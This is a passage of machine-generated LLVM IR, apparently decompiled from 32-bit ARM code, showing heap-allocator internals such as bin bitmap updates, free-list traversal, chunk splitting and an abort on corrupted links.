  %v1_15bdc = add i32 %v5_15bd8, 820
  %v2_15bdc = inttoptr i32 %v1_15bdc to i32*
  %v3_15bdc = load i32, i32* %v2_15bdc, align 4
  %v1_15be0 = urem i32 %v0_15be0, 32
  store i32 %v1_15be0, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_15be8 = shl i32 1, %v1_15be0
  %v8_15be8 = or i32 %v3_15bdc, %v7_15be8
  store i32 %v8_15be8, i32* %r3.global-to-local, align 4
  %v1_15bec = load i32, i32* @r6, align 4
  %v2_15bec = add i32 %v1_15bec, 12
  %v3_15bec = inttoptr i32 %v2_15bec to i32*
  store i32 %v0_15bec, i32* %v3_15bec, align 4
  %v0_15bf0 = load i32, i32* @lr, align 4
  %v1_15bf0 = load i32, i32* @r6, align 4
  %v2_15bf0 = add i32 %v1_15bf0, 8
  %v3_15bf0 = inttoptr i32 %v2_15bf0 to i32*
  store i32 %v0_15bf0, i32* %v3_15bf0, align 4
  %v0_15bf4 = load i32, i32* %r3.global-to-local, align 4
  %v1_15bf4 = load i32, i32* %r1.global-to-local, align 4
  %v2_15bf4 = add i32 %v1_15bf4, 820
  %v3_15bf4 = inttoptr i32 %v2_15bf4 to i32*
  store i32 %v0_15bf4, i32* %v3_15bf4, align 4
  %v0_15bf8 = load i32, i32* @r6, align 4
  %v1_15bf8 = load i32, i32* @lr, align 4
  %v2_15bf8 = add i32 %v1_15bf8, 12
  %v3_15bf8 = inttoptr i32 %v2_15bf8 to i32*
  store i32 %v0_15bf8, i32* %v3_15bf8, align 4
  %v0_15bfc = load i32, i32* @r6, align 4
  %v1_15bfc = load i32, i32* %ip.global-to-local, align 4
  %v2_15bfc = add i32 %v1_15bfc, 8
  %v3_15bfc = inttoptr i32 %v2_15bfc to i32*
  store i32 %v0_15bfc, i32* %v3_15bfc, align 4
  %v0_15c18.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15c18

dec_label_pc_15c04:                               ; preds = %dec_label_pc_15aa4, %dec_label_pc_15a5c, %dec_label_pc_15ab8
  store i32 32, i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %r1.global-to-local, align 4
  %v4_15c0c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 32) to i32*), align 4
  store i32 %v4_15c0c, i32* @sb, align 4
  %v0_15c10 = load i32, i32* @sl, align 4
  %v1_15c10 = add i32 %v0_15c10, 16
  store i32 %v1_15c10, i32* @fp, align 4
  %v1_15c14 = add i32 %v4_15c0c, 52
  store i32 %v1_15c14, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15c18

dec_label_pc_15c18:                               ; preds = %dec_label_pc_15bcc, %dec_label_pc_15c04
  %v0_15b38 = phi i32 [ %v0_15c18.pre, %dec_label_pc_15bcc ], [ %v1_15c14, %dec_label_pc_15c04 ]
  %v1_15c18 = add i32 %v0_15b38, 12
  %v2_15c18 = inttoptr i32 %v1_15c18 to i32*
  %v3_15c18 = load i32, i32* %v2_15c18, align 4
  store i32 %v3_15c18, i32* @r6, align 4
  %v9_15c1c = icmp eq i32 %v3_15c18, %v0_15b38
  br i1 %v9_15c1c, label %dec_label_pc_15c24, label %dec_label_pc_15acc

dec_label_pc_15c24:                               ; preds = %dec_label_pc_15c18
  %v0_15c24 = load i32, i32* @sl, align 4
  %tmp206 = icmp ult i32 %v0_15c24, 256
  %v0_15cdc.pre = load i32, i32* @r7, align 4
  br i1 %tmp206, label %dec_label_pc_15c24.dec_label_pc_15cdc_crit_edge, label %dec_label_pc_15c2c

dec_label_pc_15c24.dec_label_pc_15cdc_crit_edge:  ; preds = %dec_label_pc_15c24
  %.pre200 = mul i32 %v0_15cdc.pre, 8
  br label %dec_label_pc_15cdc

dec_label_pc_15c2c:                               ; preds = %dec_label_pc_15c24
  %v4_15c2c = mul i32 %v0_15cdc.pre, 8
  %v5_15c2c = add i32 %v4_15c2c, %v0_15b38
  store i32 %v5_15c2c, i32* %r3.global-to-local, align 4
  %v1_15c30 = add i32 %v5_15c2c, -8
  store i32 %v1_15c30, i32* %r1.global-to-local, align 4
  %v1_15c34 = add i32 %v5_15c2c, 4
  %v2_15c34 = inttoptr i32 %v1_15c34 to i32*
  %storemerge.pre = load i32, i32* %v2_15c34, align 4
  br label %dec_label_pc_15cd4

dec_label_pc_15c3c:                               ; preds = %dec_label_pc_15cd4
  %v1_15c3c = add i32 %v1_15c64, 4
  %v2_15c3c = inttoptr i32 %v1_15c3c to i32*
  %v3_15c3c = load i32, i32* %v2_15c3c, align 4
  store i32 %v3_15c3c, i32* %r3.global-to-local, align 4
  %v1_15c40 = and i32 %v3_15c3c, -4
  store i32 %v1_15c40, i32* %r2.global-to-local, align 4
  %v3_15c44 = icmp ult i32 %v1_15c40, %v0_15c24
  %v1_15c48 = add i32 %v1_15c64, 12
  %v2_15c48 = inttoptr i32 %v1_15c48 to i32*
  %v3_15c48 = load i32, i32* %v2_15c48, align 4
  store i32 %v3_15c48, i32* %r0.global-to-local, align 4
  br i1 %v3_15c44, label %dec_label_pc_15cd4, label %dec_label_pc_15c50

dec_label_pc_15c50:                               ; preds = %dec_label_pc_15c3c
  %v1_15c50 = add i32 %v1_15c64, 8
  %v2_15c50 = inttoptr i32 %v1_15c50 to i32*
  %v3_15c50 = load i32, i32* %v2_15c50, align 4
  store i32 %v3_15c50, i32* %r1.global-to-local, align 4
  %v1_15c54 = add i32 %v3_15c50, 12
  %v2_15c54 = inttoptr i32 %v1_15c54 to i32*
  %v3_15c54 = load i32, i32* %v2_15c54, align 4
  store i32 %v3_15c54, i32* %r3.global-to-local, align 4
  %v9_15c58 = icmp eq i32 %v3_15c54, %v1_15c64
  br i1 %v9_15c58, label %dec_label_pc_15c60, label %dec_label_pc_15c6c

dec_label_pc_15c60:                               ; preds = %dec_label_pc_15c50
  %v1_15c60 = add i32 %v3_15c48, 8
  %v2_15c60 = inttoptr i32 %v1_15c60 to i32*
  %v3_15c60 = load i32, i32* %v2_15c60, align 4
  store i32 %v3_15c60, i32* %r3.global-to-local, align 4
  %v9_15c64 = icmp eq i32 %v3_15c60, %v1_15c64
  br i1 %v9_15c64, label %dec_label_pc_15c70, label %dec_label_pc_15c6c

dec_label_pc_15c6c:                               ; preds = %dec_label_pc_15c50, %dec_label_pc_15c60
  %v0_15c6c = call i32 @abort()
  store i32 %v0_15c6c, i32* %r0.global-to-local, align 4
  %v0_15c70.pre = load i32, i32* @sl, align 4
  %v1_15c70.pre = load i32, i32* @r2, align 4
  %v0_15c78.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_15c70

dec_label_pc_15c70:                               ; preds = %dec_label_pc_15c60, %dec_label_pc_15c6c
  %v1_15c78 = phi i32 [ %v3_15c48, %dec_label_pc_15c60 ], [ %v0_15c6c, %dec_label_pc_15c6c ]
  %v0_15c78 = phi i32 [ %v3_15c50, %dec_label_pc_15c60 ], [ %v0_15c78.pre, %dec_label_pc_15c6c ]
  %v1_15c70 = phi i32 [ %v1_15c40, %dec_label_pc_15c60 ], [ %v1_15c70.pre, %dec_label_pc_15c6c ]
  %v0_15c70 = phi i32 [ %v0_15c24, %dec_label_pc_15c60 ], [ %v0_15c70.pre, %dec_label_pc_15c6c ]
  %v2_15c70 = sub i32 %v1_15c70, %v0_15c70
  store i32 %v2_15c70, i32* %lr.global-to-local, align 4
  %v2_15c78 = add i32 %v1_15c78, 8
  %v3_15c78 = inttoptr i32 %v2_15c78 to i32*
  store i32 %v0_15c78, i32* %v3_15c78, align 4
  %v0_15c7c = load i32, i32* %r0.global-to-local, align 4
  %v1_15c7c = load i32, i32* %r1.global-to-local, align 4
  %v2_15c7c = add i32 %v1_15c7c, 12
  %v3_15c7c = inttoptr i32 %v2_15c7c to i32*
  store i32 %v0_15c7c, i32* %v3_15c7c, align 4
  %v0_15c80 = load i32, i32* %ip.global-to-local, align 4
  %v1_15c80 = add i32 %v0_15c80, 8
  store i32 %v1_15c80, i32* %r0.global-to-local, align 4
  %tmp207 = icmp ugt i32 %v2_15c70, 15
  br i1 %tmp207, label %dec_label_pc_15ca0, label %dec_label_pc_15c88

dec_label_pc_15c88:                               ; preds = %dec_label_pc_15c70
  %v1_15c88 = load i32, i32* %r2.global-to-local, align 4
  %v2_15c88 = add i32 %v1_15c88, %v0_15c80
  store i32 %v2_15c88, i32* %r2.global-to-local, align 4
  %v1_15c8c = add i32 %v2_15c88, 4
  %v2_15c8c = inttoptr i32 %v1_15c8c to i32*
  %v3_15c8c = load i32, i32* %v2_15c8c, align 4
  store i32 %v3_15c8c, i32* %r3.global-to-local, align 4
  store i32 %v1_15c80, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15c94

dec_label_pc_15c94.loopexit:                      ; preds = %dec_label_pc_15b34
  %v1_15b40 = load i32, i32* @r6, align 4
  %v2_15b40 = load i32, i32* @sl, align 4
  %v3_15b40 = add i32 %v2_15b40, %v1_15b40
  store i32 %v3_15b40, i32* %r2.global-to-local, align 4
  %v2_15b44 = add i32 %v3_15b40, 4
  %v3_15b44 = inttoptr i32 %v2_15b44 to i32*
  %v4_15b44 = load i32, i32* %v3_15b44, align 4
  store i32 %v4_15b44, i32* %r3.global-to-local, align 4
  %v2_15b48 = add i32 %v1_15b40, 8
  store i32 %v2_15b48, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15c94

dec_label_pc_15c94:                               ; preds = %.dec_label_pc_15c94_crit_edge, %dec_label_pc_15c94.loopexit, %dec_label_pc_15c88
  %v1_15c98 = phi i32 [ %v4_15dbc, %.dec_label_pc_15c94_crit_edge ], [ %v3_15b40, %dec_label_pc_15c94.loopexit ], [ %v2_15c88, %dec_label_pc_15c88 ]
  %v0_15c94 = phi i32 [ %v7_15dbc, %.dec_label_pc_15c94_crit_edge ], [ %v4_15b44, %dec_label_pc_15c94.loopexit ], [ %v3_15c8c, %dec_label_pc_15c88 ]
  %v1_15c94 = or i32 %v0_15c94, 1
  store i32 %v1_15c94, i32* %r3.global-to-local, align 4
  %v2_15c98 = add i32 %v1_15c98, 4
  %v3_15c98 = inttoptr i32 %v2_15c98 to i32*
  store i32 %v1_15c94, i32* %v3_15c98, align 4
  br label %dec_label_pc_16254

dec_label_pc_15ca0:                               ; preds = %dec_label_pc_15c70
  %v1_15ca0 = load i32, i32* @sl, align 4
  %v2_15ca0 = add i32 %v1_15ca0, %v0_15c80
  store i32 %v2_15ca0, i32* %r2.global-to-local, align 4
  %v1_15ca4 = or i32 %v1_15ca0, 1
  store i32 %v1_15ca4, i32* %r3.global-to-local, align 4
  %v0_15ca8 = load i32, i32* %lr.global-to-local, align 4
  %v1_15ca8 = or i32 %v0_15ca8, 1
  store i32 %v1_15ca8, i32* %r1.global-to-local, align 4
  store i32 %v1_15c80, i32* %r4.global-to-local, align 4
  %v2_15cb0 = add i32 %v0_15c80, 4
  %v3_15cb0 = inttoptr i32 %v2_15cb0 to i32*
  store i32 %v1_15ca4, i32* %v3_15cb0, align 4
  %v0_15cb4 = load i32, i32* %r2.global-to-local, align 4
  %v1_15cb4 = load i32, i32* @r6, align 4
  %v2_15cb4 = add i32 %v1_15cb4, 8
  %v3_15cb4 = inttoptr i32 %v2_15cb4 to i32*
  store i32 %v0_15cb4, i32* %v3_15cb4, align 4
  %v0_15cb8 = load i32, i32* %r2.global-to-local, align 4
  %v1_15cb8 = load i32, i32* @r6, align 4
  %v2_15cb8 = add i32 %v1_15cb8, 12
  %v3_15cb8 = inttoptr i32 %v2_15cb8 to i32*
  store i32 %v0_15cb8, i32* %v3_15cb8, align 4
  %v0_15cbc = load i32, i32* %lr.global-to-local, align 4
  %v1_15cbc = load i32, i32* %r2.global-to-local, align 4
  %v3_15cbc = add i32 %v1_15cbc, %v0_15cbc
  %v4_15cbc = inttoptr i32 %v3_15cbc to i32*
  store i32 %v0_15cbc, i32* %v4_15cbc, align 4
  %v0_15cc0 = load i32, i32* %r1.global-to-local, align 4
  %v1_15cc0 = load i32, i32* %r2.global-to-local, align 4
  %v2_15cc0 = add i32 %v1_15cc0, 4
  %v3_15cc0 = inttoptr i32 %v2_15cc0 to i32*
  store i32 %v0_15cc0, i32* %v3_15cc0, align 4
  %v0_15cc4 = load i32, i32* @r6, align 4
  %v1_15cc4 = load i32, i32* %r2.global-to-local, align 4
  %v2_15cc4 = add i32 %v1_15cc4, 12
  %v3_15cc4 = inttoptr i32 %v2_15cc4 to i32*
  store i32 %v0_15cc4, i32* %v3_15cc4, align 4
  %v0_15cc8 = load i32, i32* @r6, align 4
  %v1_15cc8 = load i32, i32* %r2.global-to-local, align 4
  %v2_15cc8 = add i32 %v1_15cc8, 8
  %v3_15cc8 = inttoptr i32 %v2_15cc8 to i32*
  store i32 %v0_15cc8, i32* %v3_15cc8, align 4
  br label %dec_label_pc_16254

dec_label_pc_15cd4:                               ; preds = %dec_label_pc_15c3c, %dec_label_pc_15c2c
  %v1_15c64 = phi i32 [ %storemerge.pre, %dec_label_pc_15c2c ], [ %v3_15c48, %dec_label_pc_15c3c ]
  store i32 %v1_15c64, i32* %ip.global-to-local, align 4
  %v9_15cd4 = icmp eq i32 %v1_15c64, %v1_15c30
  br i1 %v9_15cd4, label %dec_label_pc_15cdc.loopexit, label %dec_label_pc_15c3c

dec_label_pc_15cdc.loopexit:                      ; preds = %dec_label_pc_15cd4
  br label %dec_label_pc_15cdc

dec_label_pc_15cdc:                               ; preds = %dec_label_pc_15c24.dec_label_pc_15cdc_crit_edge, %dec_label_pc_15cdc.loopexit
  %v4_15d0c.pre-phi = phi i32 [ %.pre200, %dec_label_pc_15c24.dec_label_pc_15cdc_crit_edge ], [ %v4_15c2c, %dec_label_pc_15cdc.loopexit ]
  %v1_15cdc = add i32 %v0_15cdc.pre, 1
  store i32 %v1_15cdc, i32* %r2.global-to-local, align 4
  %v1_15ce0 = urem i32 %v1_15cdc, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %r0.global-to-local, align 4
  %v6_15cec = shl i32 1, %v1_15ce0
  store i32 %v6_15cec, i32* %ip.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_15cf4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 32) to i32*), align 4
  store i32 %v4_15cf4, i32* %r3.global-to-local, align 4
  %v3_15cf8 = udiv i32 %v1_15cdc, 32
  store i32 %v3_15cf8, i32* @r5, align 4
  %v4_15cfc = mul nuw nsw i32 %v3_15cf8, 4
  %v5_15cfc = add i32 %v4_15cf4, %v4_15cfc
  store i32 %v5_15cfc, i32* %r2.global-to-local, align 4
  %v1_15d00 = add i32 %v5_15cfc, 820
  %v2_15d00 = inttoptr i32 %v1_15d00 to i32*
  %v3_15d00 = load i32, i32* %v2_15d00, align 4
  store i32 %v3_15d00, i32* @r4, align 4
  %v1_15d04 = add i32 %v4_15cf4, 52
  store i32 %v1_15d04, i32* %r3.global-to-local, align 4
  store i32 32, i32* @r8, align 4
  %v5_15d0c = add i32 %v1_15d04, %v4_15d0c.pre-phi
  store i32 %v5_15d0c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15d10

dec_label_pc_15d10:                               ; preds = %dec_label_pc_15d78, %dec_label_pc_15cdc
  %v1_15d18 = phi i32 [ %v1_15d18.pre, %dec_label_pc_15d78 ], [ %v3_15d00, %dec_label_pc_15cdc ]
  %v0_15d18 = phi i32 [ %v0_15d10.pre, %dec_label_pc_15d78 ], [ %v6_15cec, %dec_label_pc_15cdc ]
  %v1_15d10 = sub i32 1, %v0_15d18
  %v2_15d10 = icmp ult i32 %v0_15d18, 2
  %v1_15d10. = select i1 %v2_15d10, i32 %v1_15d10, i32 0
  store i32 %v1_15d10., i32* %r3.global-to-local, align 4
  %tmp141 = icmp ugt i32 %v0_15d18, %v1_15d18
  br i1 %tmp141, label %.thread12, label %bb142

.thread12:                                        ; preds = %dec_label_pc_15d10
  %v5_15d1c = or i32 %v1_15d10., 1
  store i32 %v5_15d1c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15d28.preheader

bb142:                                            ; preds = %dec_label_pc_15d10
  %v2_15d20 = icmp eq i32 %v1_15d10., 0
  br i1 %v2_15d20, label %.dec_label_pc_15d64.preheader_crit_edge, label %dec_label_pc_15d28.preheader

.dec_label_pc_15d64.preheader_crit_edge:          ; preds = %bb142
  %v0_15d5c54.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15d64.preheader

dec_label_pc_15d28.preheader:                     ; preds = %bb142, %.thread12
  %v0_15d28.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15d28

dec_label_pc_15d28:                               ; preds = %dec_label_pc_15d28.preheader, %dec_label_pc_15d34
  %v0_15d28 = phi i32 [ %v0_15d28.pre, %dec_label_pc_15d28.preheader ], [ %v1_15d28, %dec_label_pc_15d34 ]
  %v1_15d28 = add i32 %v0_15d28, 1
  store i32 %v1_15d28, i32* @r5, align 4
  %tmp208 = icmp ugt i32 %v1_15d28, 2
  br i1 %tmp208, label %dec_label_pc_15e08.loopexit, label %dec_label_pc_15d34

dec_label_pc_15d34:                               ; preds = %dec_label_pc_15d28
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %r3.global-to-local, align 4
  %v1_15d38 = load i32, i32* @r8, align 4
  %v2_15d38 = add i32 %v1_15d38, ptrtoint (i32* @global_var_2947c.811 to i32)
  %v3_15d38 = inttoptr i32 %v2_15d38 to i32*
  %v4_15d38 = load i32, i32* %v3_15d38, align 4
  store i32 %v4_15d38, i32* %r2.global-to-local, align 4
  %v4_15d3c = mul i32 %v1_15d28, 4
  %v5_15d3c = add i32 %v4_15d38, %v4_15d3c
  store i32 %v5_15d3c, i32* %r3.global-to-local, align 4
  %v1_15d40 = add i32 %v5_15d3c, 820
  %v2_15d40 = inttoptr i32 %v1_15d40 to i32*
  %v3_15d40 = load i32, i32* %v2_15d40, align 4
  store i32 %v3_15d40, i32* @r4, align 4
  %v2_15d44 = icmp eq i32 %v3_15d40, 0
  br i1 %v2_15d44, label %dec_label_pc_15d28, label %dec_label_pc_15d4c

dec_label_pc_15d4c:                               ; preds = %dec_label_pc_15d34
  %v4_15d4c = mul i32 %v1_15d28, 256
  %v5_15d4c = add i32 %v4_15d38, %v4_15d4c
  store i32 %v5_15d4c, i32* %r3.global-to-local, align 4
  %v1_15d50 = add i32 %v5_15d4c, 44
  store i32 %v1_15d50, i32* %r0.global-to-local, align 4
  %v0_15d54 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_15d54, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_15d64.preheader

dec_label_pc_15d64.preheader:                     ; preds = %.dec_label_pc_15d64.preheader_crit_edge, %dec_label_pc_15d4c
  %v0_15d5c54 = phi i32 [ %v1_15d50, %dec_label_pc_15d4c ], [ %v0_15d5c54.pre, %.dec_label_pc_15d64.preheader_crit_edge ]
  %v0_15d80 = phi i32 [ %v3_15d40, %dec_label_pc_15d4c ], [ %v1_15d18, %.dec_label_pc_15d64.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_15d54, %dec_label_pc_15d4c ], [ %v0_15d18, %.dec_label_pc_15d64.preheader_crit_edge ]
  %v2_15d6451 = and i32 %ip.promoted, %v0_15d80
  %v4_15d6453 = icmp eq i32 %v2_15d6451, 0
  br i1 %v4_15d6453, label %dec_label_pc_15d5c, label %dec_label_pc_15d6c

dec_label_pc_15d5c:                               ; preds = %dec_label_pc_15d64.preheader, %dec_label_pc_15d5c
  %v2_15d6056 = phi i32 [ %v2_15d60, %dec_label_pc_15d5c ], [ %ip.promoted, %dec_label_pc_15d64.preheader ]
  %v0_15d5c55 = phi i32 [ %v1_15d5c, %dec_label_pc_15d5c ], [ %v0_15d5c54, %dec_label_pc_15d64.preheader ]
  %v1_15d5c = add i32 %v0_15d5c55, 8
  %v2_15d60 = mul i32 %v2_15d6056, 2
  %v2_15d64 = and i32 %v2_15d60, %v0_15d80
  %v4_15d64 = icmp eq i32 %v2_15d64, 0
  br i1 %v4_15d64, label %dec_label_pc_15d5c, label %dec_label_pc_15d64.dec_label_pc_15d6c_crit_edge

dec_label_pc_15d64.dec_label_pc_15d6c_crit_edge:  ; preds = %dec_label_pc_15d5c
  store i32 %v1_15d5c, i32* %r0.global-to-local, align 4
  store i32 %v2_15d60, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_15d6c

dec_label_pc_15d6c:                               ; preds = %dec_label_pc_15d64.dec_label_pc_15d6c_crit_edge, %dec_label_pc_15d64.preheader
  %v0_15d8c = phi i32 [ %v2_15d60, %dec_label_pc_15d64.dec_label_pc_15d6c_crit_edge ], [ %ip.promoted, %dec_label_pc_15d64.preheader ]
  %v0_15db0 = phi i32 [ %v1_15d5c, %dec_label_pc_15d64.dec_label_pc_15d6c_crit_edge ], [ %v0_15d5c54, %dec_label_pc_15d64.preheader ]
  %v1_15d6c = add i32 %v0_15db0, 12
  %v2_15d6c = inttoptr i32 %v1_15d6c to i32*
  %v3_15d6c = load i32, i32* %v2_15d6c, align 4
  store i32 %v3_15d6c, i32* @lr, align 4
  %v9_15d70 = icmp eq i32 %v3_15d6c, %v0_15db0
  br i1 %v9_15d70, label %dec_label_pc_15d78, label %dec_label_pc_15d98

dec_label_pc_15d78:                               ; preds = %dec_label_pc_15d6c
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %r0.global-to-local, align 4
  %v1_15d7c = load i32, i32* @r8, align 4
  %v2_15d7c = add i32 %v1_15d7c, ptrtoint (i32* @global_var_2947c.811 to i32)
  %v3_15d7c = inttoptr i32 %v2_15d7c to i32*
  %v4_15d7c = load i32, i32* %v3_15d7c, align 4
  %v2_15d80 = sub i32 -1, %v0_15d8c
  %v3_15d80 = and i32 %v0_15d80, %v2_15d80
  store i32 %v3_15d80, i32* @r4, align 4
  %v1_15d84 = load i32, i32* @r5, align 4
  %v4_15d84 = mul i32 %v1_15d84, 4
  %v5_15d84 = add i32 %v4_15d84, %v4_15d7c
  store i32 %v5_15d84, i32* %r3.global-to-local, align 4
  %v1_15d88 = add i32 %v0_15db0, 8
  store i32 %v1_15d88, i32* %r0.global-to-local, align 4
  %v2_15d8c = mul i32 %v0_15d8c, 2
  store i32 %v2_15d8c, i32* %ip.global-to-local, align 4
  %v2_15d90 = add i32 %v5_15d84, 820
  %v3_15d90 = inttoptr i32 %v2_15d90 to i32*
  store i32 %v3_15d80, i32* %v3_15d90, align 4
  %v0_15d10.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_15d18.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15d10

dec_label_pc_15d98:                               ; preds = %dec_label_pc_15d6c
  %v1_15d98 = add i32 %v3_15d6c, 4
  %v2_15d98 = inttoptr i32 %v1_15d98 to i32*
  %v3_15d98 = load i32, i32* %v2_15d98, align 4
  store i32 %v3_15d98, i32* %r3.global-to-local, align 4
  %v1_15d9c = and i32 %v3_15d98, -4
  store i32 %v1_15d9c, i32* %r2.global-to-local, align 4
  %v0_15da0 = load i32, i32* @sl, align 4
  %v2_15da0 = sub i32 %v1_15d9c, %v0_15da0
  store i32 %v2_15da0, i32* %ip.global-to-local, align 4
  %v1_15da4 = add i32 %v3_15d6c, 12
  %v2_15da4 = inttoptr i32 %v1_15da4 to i32*
  %v3_15da4 = load i32, i32* %v2_15da4, align 4
  store i32 %v3_15da4, i32* %r3.global-to-local, align 4
  %tmp209 = icmp ult i32 %v2_15da0, 16
  br i1 %tmp209, label %bb143, label %bb144

bb143:                                            ; preds = %dec_label_pc_15d98
  %v6_15dac = add i32 %v1_15d9c, %v3_15d6c
  store i32 %v6_15dac, i32* %r2.global-to-local, align 4
  br label %bb144

bb144:                                            ; preds = %dec_label_pc_15d98, %bb143
  %v2_15db0 = add i32 %v3_15da4, 8
  %v3_15db0 = inttoptr i32 %v2_15db0 to i32*
  store i32 %v0_15db0, i32* %v3_15db0, align 4
  %v0_15db4 = load i32, i32* %r3.global-to-local, align 4
  %v1_15db4 = load i32, i32* %r0.global-to-local, align 4
  %v2_15db4 = add i32 %v1_15db4, 12
  %v3_15db4 = inttoptr i32 %v2_15db4 to i32*
  store i32 %v0_15db4, i32* %v3_15db4, align 4
  %v4_15db8 = load i32, i32* @lr, align 4
  br i1 %tmp209, label %.dec_label_pc_15c94_crit_edge, label %dec_label_pc_15dc4

.dec_label_pc_15c94_crit_edge:                    ; preds = %bb144
  %v5_15db8 = add i32 %v4_15db8, 8
  store i32 %v5_15db8, i32* %r4.global-to-local, align 4
  %v4_15dbc = load i32, i32* %r2.global-to-local, align 4
  %v5_15dbc = add i32 %v4_15dbc, 4
  %v6_15dbc = inttoptr i32 %v5_15dbc to i32*
  %v7_15dbc = load i32, i32* %v6_15dbc, align 4
  store i32 %v7_15dbc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15c94

dec_label_pc_15dc4:                               ; preds = %bb144
  %v1_15dc4 = load i32, i32* @sl, align 4
  %v2_15dc4 = add i32 %v1_15dc4, %v4_15db8
  store i32 %v2_15dc4, i32* %r1.global-to-local, align 4
  %v1_15dcc = load i32, i32* @r6, align 4
  %v2_15dcc = add i32 %v1_15dcc, 8
  %v3_15dcc = inttoptr i32 %v2_15dcc to i32*
  store i32 %v2_15dc4, i32* %v3_15dcc, align 4
  %v0_15dd0 = load i32, i32* %r1.global-to-local, align 4
  %v1_15dd0 = load i32, i32* @r6, align 4
  %v2_15dd0 = add i32 %v1_15dd0, 12
  %v3_15dd0 = inttoptr i32 %v2_15dd0 to i32*
  store i32 %v0_15dd0, i32* %v3_15dd0, align 4
  %v0_15dd4 = load i32, i32* @r6, align 4
  %v1_15dd4 = load i32, i32* %r1.global-to-local, align 4
  %v2_15dd4 = add i32 %v1_15dd4, 8
  %v3_15dd4 = inttoptr i32 %v2_15dd4 to i32*
  store i32 %v0_15dd4, i32* %v3_15dd4, align 4
  %v0_15dd8 = load i32, i32* @r6, align 4
  %v1_15dd8 = load i32, i32* %r1.global-to-local, align 4
  %v2_15dd8 = add i32 %v1_15dd8, 12
  %v3_15dd8 = inttoptr i32 %v2_15dd8 to i32*
  store i32 %v0_15dd8, i32* %v3_15dd8, align 4
  %tmp210 = icmp ult i32 %v1_15dc4, 256
  br i1 %tmp210, label %bb145, label %.thread121

bb145:                                            ; preds = %dec_label_pc_15dc4
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %r2.global-to-local, align 4
  %v8_15de4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 32) to i32*), align 4
  store i32 %v8_15de4, i32* %r3.global-to-local, align 4
  %v4_15de8 = load i32, i32* %r1.global-to-local, align 4
  %v6_15de8 = add i32 %v8_15de4, 48
  %v7_15de8 = inttoptr i32 %v6_15de8 to i32*
  store i32 %v4_15de8, i32* %v7_15de8, align 4
  br label %.thread121

.thread121:                                       ; preds = %dec_label_pc_15dc4, %bb145
  %v0_15dec = load i32, i32* @sl, align 4
  %v1_15dec = or i32 %v0_15dec, 1
  store i32 %v1_15dec, i32* %r2.global-to-local, align 4
  %v0_15df0 = load i32, i32* %ip.global-to-local, align 4
  %v1_15df0 = or i32 %v0_15df0, 1
  store i32 %v1_15df0, i32* %r3.global-to-local, align 4
  %v0_15df4 = load i32, i32* @lr, align 4
  %v1_15df4 = add i32 %v0_15df4, 8
  store i32 %v1_15df4, i32* %r4.global-to-local, align 4
  %v2_15df8 = add i32 %v0_15df4, 4
  %v3_15df8 = inttoptr i32 %v2_15df8 to i32*
  store i32 %v1_15dec, i32* %v3_15df8, align 4
  %v0_15dfc = load i32, i32* %ip.global-to-local, align 4
  %v1_15dfc = load i32, i32* %r1.global-to-local, align 4
  %v3_15dfc = add i32 %v1_15dfc, %v0_15dfc
  %v4_15dfc = inttoptr i32 %v3_15dfc to i32*
  store i32 %v0_15dfc, i32* %v4_15dfc, align 4
  %v0_15e00 = load i32, i32* %r3.global-to-local, align 4
  %v1_15e00 = load i32, i32* %r1.global-to-local, align 4
  %v2_15e00 = add i32 %v1_15e00, 4
  %v3_15e00 = inttoptr i32 %v2_15e00 to i32*
  store i32 %v0_15e00, i32* %v3_15e00, align 4
  br label %dec_label_pc_16254

dec_label_pc_15e08.loopexit:                      ; preds = %dec_label_pc_15d28
  br label %dec_label_pc_15e08

dec_label_pc_15e08:                               ; preds = %dec_label_pc_15e08.loopexit, %dec_label_pc_15a1c, %dec_label_pc_15a24
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %ip.global-to-local, align 4
  %v4_15e10 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 32) to i32*), align 4
  store i32 %v4_15e10, i32* @r0, align 4
  %v1_15e14 = add i32 %v4_15e10, 44
  %v2_15e14 = inttoptr i32 %v1_15e14 to i32*
  %v3_15e14 = load i32, i32* %v2_15e14, align 4
  store i32 %v3_15e14, i32* %ip.global-to-local, align 4
  %v1_15e18 = add i32 %v3_15e14, 4
  %v2_15e18 = inttoptr i32 %v1_15e18 to i32*
  %v3_15e18 = load i32, i32* %v2_15e18, align 4
  %v0_15e1c = load i32, i32* @sl, align 4
  %v1_15e1c = add i32 %v0_15e1c, 16
  store i32 %v1_15e1c, i32* %r1.global-to-local, align 4
  %v1_15e20 = and i32 %v3_15e18, -4
  store i32 %v1_15e20, i32* %r3.global-to-local, align 4
  %v3_15e24 = icmp ult i32 %v1_15e20, %v1_15e1c
